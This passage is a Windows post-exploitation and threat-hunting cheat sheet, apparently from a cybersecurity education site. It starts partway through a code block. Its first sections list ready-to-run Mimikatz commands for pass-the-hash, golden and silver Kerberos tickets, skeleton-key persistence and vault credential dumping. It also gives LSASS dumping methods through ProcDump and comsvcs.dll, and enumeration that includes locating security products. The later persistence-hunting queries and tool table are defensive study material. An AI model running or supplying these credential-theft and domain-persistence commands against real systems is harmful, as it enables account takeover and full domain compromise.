:: === PASS-THE-HASH ===
sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM_HASH> /run:cmd.exe
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"powershell -nop"

:: === PASS-THE-TICKET ===
kerberos::list
kerberos::list /export
kerberos::ptt ticket.kirbi

:: === GOLDEN TICKET ===
kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /id:500
kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt

:: === SILVER TICKET ===
kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /target:<server.domain> /service:cifs /rc4:<MACHINE_HASH> /ptt

:: === SKELETON KEY (domain persistence) ===
misc::skeleton

:: === CREDENTIAL MANAGER ===
vault::cred
vault::list

:: === MINIDUMP LSASS ===
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## LSASS Dump (Without Mimikatz on Disk)

```powershell
# Task Manager → Processes → lsass.exe → Create Dump File
# Then load in mimikatz: sekurlsa::minidump C:\Users\<user>\AppData\Local\Temp\lsass.DMP

# ProcDump (Microsoft signed)
.\procdump.exe -ma lsass.exe lsass.dmp
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# PowerShell (comsvcs.dll)
$id = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $id C:\lsass.dmp full

# Load dump in mimikatz
sekurlsa::minidump C:\lsass.dmp
sekurlsa::logonpasswords
```

---

## Post-Ex Enumeration

```powershell
# === SYSTEM ===
systeminfo
hostname
whoami /all
net user
net localgroup administrators
ipconfig /all
arp -a
netstat -ano
route print

# === PROCESSES ===
tasklist /v
Get-Process | Select Name, Id, Path

# === DOMAIN ===
net user /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
nltest /domain_trusts

# === SHARES ===
net share
net view \\<TARGET>

# === ANTIVIRUS / EDR ===
sc query windefend
Get-MpComputerStatus
tasklist | findstr /i "defender mssense cortana crowdstrike sentinel carbonblack cylance"

# === CLIPBOARD ===
Get-Clipboard

# === RECENT FILES ===
dir "$env:APPDATA\Microsoft\Windows\Recent" /b

# === BROWSER HISTORY ===
# Chrome
dir "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
# Firefox
dir "$env:APPDATA\Mozilla\Firefox\Profiles"
```

---

## Persistence Threat Hunting Cheat Sheet

```powershell
# === STARTUP / RUN KEYS ===
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-CimInstance Win32_StartupCommand | Select Name, Command, Location, User

# === SCHEDULED TASKS ===
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Format-Table TaskName, TaskPath, State
schtasks /query /fo LIST /v | findstr /i "system"
Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse -File | Where-Object { $_.FullName -notlike "*Microsoft*" }

# === WINLOGON ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"

# === IFEO ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s

# === SERVICES ===
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Select Name, DisplayName, Status

# === WMI SUBSCRIPTIONS ===
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# === BITS JOBS ===
bitsadmin /list /allusers /verbose

# === APPINIT DLLs ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs

# === LSA / SSP ===
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"

# === AMSI PROVIDERS ===
reg query "HKLM\SOFTWARE\Microsoft\AMSI\Providers"

# === NETWORK PROVIDERS ===
reg query "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"

# === COM / HKCU OVERRIDES ===
reg query "HKCU\Software\Classes\CLSID" /s

# === COR_PROFILER ===
reg query "HKCU\Environment" /v COR_PROFILER_PATH
reg query "HKCU\Environment" /v COR_ENABLE_PROFILING

# === PRINT PROCESSORS ===
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors"

# === SHELL EXTENSIONS ===
reg query "HKCU\Software\Classes\*\shellex\ContextMenuHandlers"

# === CREDENTIAL PROVIDERS ===
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"

# === WINSOCK LSP ===
netsh winsock show catalog

# === POWERSHELL PROFILE ===
cat "$HOME\Documents\WindowsPowerShell\profile.ps1"

# === USERS ===
net user
net localgroup "Administrators"

# === OBFUSCATED LOADER REGISTRY ===
reg query "HKCU\Software\Microsoft\WindowsUpdate"
reg query "HKCU\Software\Microsoft\Sync"
reg query "HKCU\Software\Microsoft\EdgeUpdate"
reg query "HKCU\Software\Microsoft\Cfg"
```

---

## Detection Tools Reference

| Tool | Use |
|------|-----|
| **Autoruns (Sysinternals)** | Complete persistence enumeration — gold standard |
| **Process Monitor** | Real-time registry/file write; phantom DLL hunting |
| **Sysmon** | Process creation, registry, DLL loads, network |
| **PrivescCheck** | Automated privilege escalation enumeration |
| **PowerUp** | PowerSploit privesc module |
| **SharpUp** | C# privesc (AV-friendly) |
| **LaZagne** | Multi-application credential recovery |
| **SessionGopher** | Session credential harvesting |
| **Mimikatz** | LSASS credential dumping, pass-the-hash/ticket |
| **wes.py** | Windows Exploit Suggester (patch gap analysis) |
| **accesschk.exe** | Permission auditing on files, dirs, registry, services |
| **bitsadmin /list** | BITS job enumeration |
| **netsh winsock show catalog** | LSP DLL enumeration |

---

> Hacker Tamizha — cybersecurity education for Tamil-speaking community
> Author: m.manikandan | Kumbakonam, Tamil Nadu
> All techniques demonstrated in isolated lab environment only.
